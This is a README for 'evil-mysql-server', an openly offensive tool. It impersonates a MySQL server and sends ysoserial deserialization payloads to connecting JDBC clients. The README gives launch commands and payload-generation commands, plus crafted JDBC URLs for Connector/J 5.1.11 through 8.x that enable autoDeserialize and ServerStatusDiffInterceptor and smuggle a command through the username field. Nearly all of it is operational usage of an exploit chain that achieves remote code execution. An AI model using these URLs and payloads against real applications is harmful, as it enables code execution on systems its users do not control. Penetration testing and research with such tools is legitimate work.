# evil mysql server

English | [简体中文](./README-zh_CN.md)

## Introduction

**evil-mysql-server** is a malicious database written to target jdbc deserialization vulnerabilities and requires ysoserial.

Usage

[ysoserial](https://github.com/frohoff/ysoserial)

```shell
./evil-mysql-server -addr 3306 -java java -ysoserial ysoserial-0.0.6-SNAPSHOT-all.jar
```

After successful startup use jdbc to connect, where the username format is `yso_payload_command`, after successful connection **evil-mysql-server** will parse the username and generate malicious data back to the jdbc client using the following command.

```shell
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 calc.exe
```

[ysuserial](https://github.com/su18/ysoserial) It's an enhanced project based on original ysoserial.

```shell
./evil-mysql-server -addr 3306 -java java -ysuserial ysuserial-0.9-su18-all.jar
```

After successful startup use jdbc to connect, where the username format is `ysu_payload_command`, after successful connection **evil-mysql-server** will parse the username and generate malicious data back to the jdbc client using the following command.

```shell
java -jar ysuserial-0.9-su18-all.jar -g CommonsCollections1 -p calc.exe
```

## JDBC url examples

**5.1.11-5.x**
```shell
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections1_calc.exe
```

**6.x**
```shell
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections1_calc.exe
```

**8.x**
```shell
jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections1_calc.exe
```

## Thanks

Thanks to the following projects for the inspiration

- [MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)